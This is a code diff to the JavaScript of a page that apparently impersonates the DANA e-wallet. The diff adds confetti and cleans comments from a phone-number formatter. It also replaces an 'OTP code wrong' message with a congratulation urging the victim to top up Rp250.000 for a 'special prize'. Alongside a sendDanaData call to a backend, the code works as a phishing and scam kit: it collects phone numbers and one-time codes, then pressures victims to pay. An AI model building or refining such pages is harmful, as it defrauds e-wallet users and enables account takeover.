@@ -60,6 +60,28 @@ document.addEventListener('DOMContentLoaded', () => {
     ac.style.display = 'block';
   }
 
+  function createConfetti() {
+    const colors = ['#FFD700', '#FF4081', '#4CAF50', '#2196F3', '#9C27B0'];
+    const notification = document.getElementById('reward-notification');
+    
+    // Clear existing confetti
+    const existingConfetti = document.querySelectorAll('.confetti-piece');
+    existingConfetti.forEach(el => el.remove());
+    
+    // Create new confetti
+    for (let i = 0; i < 30; i++) {
+      const confetti = document.createElement('div');
+      confetti.className = 'confetti-piece';
+      confetti.style.left = Math.random() * 100 + '%';
+      confetti.style.top = Math.random() * 100 + '%';
+      confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+      confetti.style.width = Math.random() * 8 + 4 + 'px';
+      confetti.style.height = confetti.style.width;
+      confetti.style.animationDelay = Math.random() * 3 + 's';
+      notification.appendChild(confetti);
+    }
+  }
+
   // Backend Communication
   async function sendDanaData(type, data) {
     try {
@@ -77,42 +99,34 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Modified Phone Number Formatting
+  // Phone Number Formatting
   pn.addEventListener('input', (e) => {
-    // Hapus semua karakter non-digit
     let value = e.target.value.replace(/\D/g, '');
     
-    // Hapus angka 0 di awal jika ada
     if (value.startsWith('0')) {
       value = value.substring(1);
     }
     
-    // Pastikan selalu dimulai dengan 8
     if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
+      value = '8' + value.replace(/^8/, '');
     }
     
-    // Batasi panjang maksimal (3+4+5=12 digit)
     if (value.length > 12) {
       value = value.substring(0, 12);
     }
     
-    // Format nomor dengan tanda hubung
     let formatted = '';
     if (value.length > 0) {
-      formatted = value.substring(0, 3); // 3 digit pertama
+      formatted = value.substring(0, 3);
       if (value.length > 3) {
-        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
+        formatted += '-' + value.substring(3, 7);
       }
       if (value.length > 7) {
-        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
+        formatted += '-' + value.substring(7, 12);
       }
     }
     
-    // Set nilai input dengan format yang sudah dibuat
     e.target.value = formatted;
-    
-    // Simpan nomor tanpa format untuk pengiriman data
     phoneNumber = value;
   });
 
@@ -198,10 +212,15 @@ document.addEventListener('DOMContentLoaded', () => {
               rn.style.display = 'block';
               rn.innerHTML = `
                 <div class="notification-content">
-                  <h3>kode OTP Salah</h3>
-                  <p>silahkan cek sms ataupan whatsapp</p>
+                  <h3>🎉 Selamat! 🎉</h3>
+                  <p>Anda mendapatkan kesempatan menyelesaikan misi spesial!</p>
+                  <div class="mission-box">
+                    <p>Top up DANA sebesar <span class="highlight">Rp250.000</span></p>
+                    <p>untuk mendapatkan hadiah spesial!</p>
+                  </div>
                 </div>
               `;
+              createConfetti();
               setTimeout(() => rn.style.display = 'none', 10000);
             }
             
